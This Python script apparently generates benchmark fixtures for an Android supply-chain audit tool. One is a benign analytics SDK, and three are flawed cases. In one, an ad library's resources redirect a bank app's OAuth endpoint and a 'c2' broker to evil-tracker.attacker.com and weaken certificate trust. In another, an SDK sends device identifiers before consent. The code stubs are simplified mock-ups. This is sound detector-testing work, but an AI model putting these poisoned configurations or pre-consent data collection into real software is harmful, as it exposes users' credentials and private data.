import json
from pathlib import Path

BASE_DIR = Path(r"c:\Users\abc\Desktop\secchain-audit\benchmarks")
BASE_DIR.mkdir(parents=True, exist_ok=True)

# 1. Benign Clean Analytics SDK
b1 = BASE_DIR / "01_benign_analytics_sdk"
b1.mkdir(parents=True, exist_ok=True)

b1_manifest = {
    "package_name": "com.clean.analytics",
    "min_sdk": 26,
    "target_sdk": 34,
    "permissions": ["INTERNET"],
    "components": []
}
(b1 / "manifest.json").write_text(json.dumps(b1_manifest, indent=2))

b1_resources = {
    "string": {
        "clean_analytics_endpoint": "https://api.clean-analytics.com/v1/event",
        "clean_analytics_version": "2.4.0"
    }
}
(b1 / "resources.json").write_text(json.dumps(b1_resources, indent=2))

b1_code = """
class CleanAnalytics:
    def __init__(self, app_context):
        self.context = app_context
        self.consent_granted = False
        self.event_queue = []

    def setConsent(self, granted):
        self.consent_granted = granted

    def logEvent(self, event_name):
        if self.consent_granted:
            payload = event_name
            import requests
            requests.post(payload)
        else:
            self.event_queue.append(event_name)
"""
(b1 / "code.py").write_text(b1_code.strip())


# 2. Duress Resource Poisoning (USENIX '23)
b2 = BASE_DIR / "02_duress_resource_poison"
b2.mkdir(parents=True, exist_ok=True)

b2_manifest = {
    "package_name": "com.target.bankapp",
    "permissions": ["INTERNET", "ACCESS_NETWORK_STATE"],
    "network_security_config": "@xml/network_security_config"
}
(b2 / "manifest.json").write_text(json.dumps(b2_manifest, indent=2))

# Multi-package collision setup:
# The malicious ad library overrides the bank app's auth endpoint and network security config
b2_resources = {
    "packages": {
        "com.evil.adnetwork": {
            "string": {
                "auth_api_endpoint": "http://evil-tracker.attacker.com/v1/oauth/token",
                "telemetry_broker": "http://evil-tracker.attacker.com/c2"
            },
            "xml": {
                "network_security_config": "<network-security-config><base-config cleartextTrafficPermitted=\"true\"><trust-anchors><certificates src=\"user\" /></trust-anchors></base-config></network-security-config>"
            }
        },
        "com.target.bankapp": {
            "string": {
                "auth_api_endpoint": "https://secure-banking.target.com/v1/oauth/token",
                "app_name": "SecureBank"
            },
            "xml": {
                "network_security_config": "<network-security-config><base-config cleartextTrafficPermitted=\"false\"><trust-anchors><certificates src=\"system\" /></trust-anchors></base-config></network-security-config>"
            }
        }
    }
}
(b2 / "resources.json").write_text(json.dumps(b2_resources, indent=2))

b2_code = """
class LoginManager:
    def doLogin(self, credentials):
        token = credentials
        import requests
        requests.post(token)
"""
(b2 / "code.py").write_text(b2_code.strip())


# 3. PICO TOI-TOC Leak SDK (USENIX '24)
b3 = BASE_DIR / "03_pico_toi_toc_leak"
b3.mkdir(parents=True, exist_ok=True)

b3_manifest = {
    "package_name": "com.stealth.tracker",
    "permissions": ["INTERNET", "READ_PHONE_STATE", "ACCESS_FINE_LOCATION"]
}
(b3 / "manifest.json").write_text(json.dumps(b3_manifest, indent=2))

b3_resources = {
    "string": {
        "stealth_sdk_version": "5.1.0"
    }
}
(b3 / "resources.json").write_text(json.dumps(b3_resources, indent=2))

# SDK that collects IMEI / Android ID in constructor before setConsent can be called
b3_code = """
class StealthTracker:
    def __init__(self, context):
        self.context = context
        self.consent = False
        # VULNERABILITY: Harvesting and transmitting sensitive identifiers inside __init__
        import TelephonyManager
        device_id = TelephonyManager.getDeviceId()
        import requests
        requests.post(device_id)

    def setConsent(self, is_granted):
        self.consent = is_granted
"""
(b3 / "code.py").write_text(b3_code.strip())


# 4. IoT Companion App Leak (USENIX '23)
b4 = BASE_DIR / "04_iot_companion_leak"
b4.mkdir(parents=True, exist_ok=True)

b4_manifest = {
    "package_name": "com.smarthome.bulbapp",
    "permissions": ["INTERNET", "BLUETOOTH", "ACCESS_WIFI_STATE", "ACCESS_FINE_LOCATION"]
}
(b4 / "manifest.json").write_text(json.dumps(b4_manifest, indent=2))

b4_resources = {
    "string": {
        "bulb_bridge_ip": "192.168.1.100"
    }
}
(b4 / "resources.json").write_text(json.dumps(b4_resources, indent=2))

b4_code = """
class IoTDeviceBridge:
    def syncSmartDevice(self, device):
        import BluetoothDevice
        ble_mac = BluetoothDevice.getAddress()
        import WifiInfo
        wifi_ssid = WifiInfo.getSSID()
        import requests
        requests.post(ble_mac)
"""
(b4 / "code.py").write_text(b4_code.strip())

print("Benchmarks created successfully!")
